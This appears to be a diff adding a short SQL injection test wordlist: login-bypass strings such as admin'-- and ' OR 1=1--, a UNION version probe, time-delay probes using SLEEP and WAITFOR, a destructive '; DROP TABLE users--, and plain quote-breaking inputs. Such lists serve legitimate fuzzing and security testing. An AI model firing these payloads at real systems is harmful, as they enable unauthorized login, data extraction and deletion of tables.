@@ -1,0 +1,18 @@
+admin'--
+admin'#
+1' OR '1'='1
+' OR 1=1--
+\'
+\"
+\';
+\";
+admin\' OR \'1\'=\'1
+'; DROP TABLE users--
+1; SELECT SLEEP(5)--
+' UNION SELECT 1,version()--
+test'
+a'b
+x"y
+z`w
+admin' AND SLEEP(5)--
+x'; WAITFOR DELAY '0:0:5'--
